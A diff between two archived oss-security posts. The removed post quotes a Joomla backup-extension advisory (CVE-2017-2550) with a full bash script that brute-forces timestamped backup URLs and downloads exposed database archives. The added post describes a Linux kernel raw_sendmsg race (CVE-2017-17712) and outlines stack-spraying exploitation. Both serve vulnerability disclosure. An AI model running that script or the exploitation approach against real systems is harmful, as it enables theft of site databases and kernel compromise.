@@ -1,69 +1,115 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/09/28/4
-Message-ID: <etPan.59ccf477.771c0a21.6fc3@community.joomla.org>
-Date: Thu, 28 Sep 2017 15:09:11 +0200
-From: David Jardin <david.jardin@...munity.joomla.org>
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2017/12/16/1
+Message-ID: <CAP8jf_BKWuYGsqrNUCbJgCFUJv0nJvp+eiKEy3Ati0FYaCED0Q@mail.gmail.com>
+Date: Sat, 16 Dec 2017 00:29:09 +0000
+From: Mohamed Ghannam <simo.ghannam@...il.com>
 To: oss-security@...ts.openwall.com
-Subject: Re: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure
+Subject: CVE-2017-17712 net/ipv4/raw.c: raw_sendmsg() race condition
 Content-Type: text/plain; charset=utf-8
 
-It’s worth to mention that the extension has a default .htaccess file with a „deny from all“ in the backup directory, that will mitigate the described attack on pretty much any standard shared-hosting platform that I’m aware of.
+Hi,
 
 
+This is an announcement for CVE-2017-17712 which is a race condition leads
+to uninitialized stack variable, this might be used to gain code execution.
 
 
-Am 28. September 2017 um 14:37:20, Larry W. Cashdollar (larry0@...com) schrieb:
+The bug was introduced  here :
+https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=c008ba5bdc9fa830e1a349b20b0be5a137bdef7a
 
-Title: Joomla extension Easy Joomla Backup v3.2.4 database backup exposure  
-Author: Larry W. Cashdollar, @_larry0  
-Date: 2017-09-07  
-CVE-ID:[CVE-2017-2550]  
-Download Site: https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup  
-Vendor: kubik-rubik  
-Vendor Notified: 2017-09-07  
-Vendor Contact:  
-Advisory: http://www.vapidlabs.com/advisory.php?v=200  
-Description: Easy Joomla Backup creates 'old-school' backups without any frills.  
-Vulnerability:  
-The software creates a copy of the backup in the web root. The file name is easily guessable as it's just a time stamp:  
+And fixed here :
+https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=8f659a03a0ba9289b9aeb9b4470e6fb263d6f483
 
-http://example.com/administrator/components/com_easyjoomlabackup/backups/DOMAIN_YEAR-MONTH-DAY_H-M-S.zip  
 
-Exploit Code:  
-• #!/bin/bash  
-• #Larry W. Cashdollar, @_larry0 9/7/2017  
-• #Bruteforce download backups for Joomla Extension Easy Joomla Backup v3.2.4  
-• #https://joomla-extensions.kubik-rubik.de/ejb-easy-joomla-backup  
-• MONTH=09  
-• DAY=07  
-• YEAR=2017  
-• Z=0  
-• #May need to set the DOMAIN to $1 the target depending on how WP is configured.  
-• DOMAIN=192.168.0.163  
-•  
-• echo "Scanning website for available backups:"  
-• for y in `seq -w 0 23`; do  
-• for x in `seq -w 0 59`; do  
-• Y=`echo "scale=2;($Z/86000)*100"|bc`;  
-• echo -ne "\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b\b$CPATH $Y%"  
-• for z in `seq -w 0 59`; do  
-• Z=$(( $Z + 1 ));  
-• CPATH="http://$1/administrator/components/com_easyjoomlabackup/backups/"$DOMAIN"_"$YEAR"-"$MONTH"-"$DAY"_"$y"-"$x"-"$z".zip";  
-• RESULT=`curl -s --head $CPATH|grep 200`;  
-• if [ -n "$RESULT" ]; then  
-• echo ""  
-• echo "[+] Location $CPATH Found";  
-• echo "[+] Received $RESULT";  
-• echo "Downloading......";  
-• wget $CPATH  
-• fi;  
-• done  
-• done  
-• done  
-• echo "Completed."
--- 
-Kind Regards,
-David Jardin
+#######   BUG DETAILS  ############
+
+
+in net/ipv4/raw.c:
+
+static int raw_sendmsg(struct sock *sk, struct msghdr *msg, size_t len)
+
+{
+
+...
+
+struct raw_frag_vec rfv;  [1]
+
+...
+
+
+...
+
+if (!inet->hdrincl) {  [2]
+
+rfv.msg = msg;
+
+rfv.hlen = 0;
+
+
+err = raw_probe_proto_opt(&rfv, &fl4);
+
+if (err)
+
+goto done;
+
+}
+
+...
+
+...
+
+if (inet->hdrincl)  [3]
+
+err = raw_send_hdrinc(sk, &fl4, msg, len,
+
+      &rt, msg->msg_flags, &ipc.sockc);
+
+
+ else {
+
+sock_tx_timestamp(sk, ipc.sockc.tsflags, &ipc.tx_flags);
+
+
+if (!ipc.addr)
+
+ipc.addr = fl4.daddr;
+
+lock_sock(sk);
+
+err = ip_append_data(sk, &fl4, raw_getfrag,
+
+     &rfv, len, 0, [4]
+
+     &ipc, &rt, msg->msg_flags);
+
+...
+
+}
+
+
+[1] rfv is not initialized and contains a pointer to a msghdr header
+structure.
+
+[2], [3] There are multiple checks against inet->hdrincl without a lock.
+
+
+When we achieve (by racing inet->hdrincl via setsockopt()) inet->hdrincl=1
+in [1], and inet->hdrincl=0 in [2], rfv variable remains uninitialized and
+used in [4].
+
+By spraying the stack with controlled user data , we can take control of
+msg pointer which is used later in ip_append_data().
+
+
+In attachment  : poc.c + kernel panic log
+
+
+#######   CREDITS  ############
+
+Mohamed GHANNAM
+
 Content of type "text/html" skipped
 
-Download attachment "signature.asc" of type "application/pgp-signature" (875 bytes)
+Download attachment "panic.log" of type "application/octet-stream" (2899 bytes)
+
+View attachment "poc.c" of type "text/x-csrc" (2287 bytes)
